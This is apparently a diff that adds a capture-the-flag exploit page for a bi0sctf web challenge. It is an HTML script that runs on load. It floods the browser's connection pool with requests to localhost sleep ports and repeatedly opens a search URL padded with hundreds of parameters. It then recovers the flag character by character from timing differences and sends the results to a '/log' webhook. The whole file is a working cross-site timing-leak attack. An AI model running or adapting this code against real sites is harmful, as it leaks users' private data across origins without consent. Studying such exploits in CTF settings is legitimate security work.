@@ -1,0 +1,108 @@
+<script>
+    const SLEEPSERVER = "localhost";
+    const ATTACKSERVER = "http://localhost:8000";
+    const WEBHOOK = "/log";
+    const alphabet = "0123456789abcdef";
+    let known = "bi0sctf_";
+
+    const URL = `${ATTACKSERVER}/search?${Array.from(Array(900)).map((e, i) => `f=content&`).join("")}&f[k]=content&q=`;
+
+    const sleep = (ms) => {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+    };
+
+    const log = async (id, data) => {
+        return new Promise((resolve) => {
+            let payload = JSON.stringify({ known, alphabet, data });
+            console.log(id, payload);
+            fetch(WEBHOOK + "?" + id + "=" + payload, {
+                mode: "no-cors",
+                cache: "no-store",
+            }).then(resolve);
+        });
+
+    };
+
+    const blockAll = async (controller) => {
+        const SOCKET_LIMIT = 255;
+        const SLEEP_SERVER = (i) =>
+            `http://${SLEEPSERVER}:` + (28000 + i) + "/sleep";
+
+        const block = async (i, controller) => {
+            try {
+                return fetch(SLEEP_SERVER(i), {
+                    mode: "no-cors",
+                    cache: "no-store",
+                    signal: controller.signal,
+                });
+            } catch (err) { }
+        };
+
+        for (let i = 1; i <= SOCKET_LIMIT; i++) {
+            block(i, controller);
+        }
+    };
+
+    const leak = async (payload, count = 3) => {
+        let leakURL = URL + payload;
+        let deltas = [];
+        let ws = [];
+
+        for (let i = 0; i < count; i++) {
+
+            let start = performance.now();
+            ws.push(window.open(leakURL));
+            await Promise.all([
+                fetch("/log?try=" + payload + " " + deltas, { mode: "no-cors", cache: "no-store" }),
+                fetch("/log?", { mode: "no-cors", cache: "no-store" }),
+                fetch("/log?", { mode: "no-cors", cache: "no-store" }),
+                fetch("/log?", { mode: "no-cors", cache: "no-store" }),
+                fetch("/log?", { mode: "no-cors", cache: "no-store" }),
+            ]);
+            let delta = performance.now() - start;
+            document.title = delta;
+
+            deltas.push(delta);
+        }
+        ws.forEach((w) => w.close());
+
+        return deltas;
+    };
+
+    const caliberate = async () => {
+        var minim = await leak("abcde", 5);
+        minim = minim.reduce((a, v) => a + v, 0) / minim.length;
+        var maxim = await leak("bi0sctf_", 5);
+        maxim = maxim.reduce((a, v) => a + v, 0) / maxim.length;
+        avg_time = (maxim + minim) / 2;
+        await log("caliberate", { avg_time, minim, maxim });
+        return avg_time;
+    };
+
+    const pwn = async () => {
+        const controller = new AbortController();
+        await blockAll(controller);
+        //await window.open(URL + '', 'pwn');
+        await sleep(500);
+        var avg_time = await caliberate();
+        await sleep(1000);
+        for (let i = 0; i < 10; i++) {
+            for (let j = 0; j < alphabet.length; j++) {
+                let deltas = await leak(known + alphabet[j]);
+                let avg = deltas.reduce((a, v) => a + v, 0) / deltas.length;
+                if (avg > avg_time) {
+                    console.log(known + alphabet[j]);
+                    known += alphabet[j];
+                    break;
+                }
+            }
+        };
+        await log("flag", known);
+        controller.abort();
+    };
+
+    window.onload = async () => {
+        await log("start", "start");
+        pwn();
+    };
+</script>
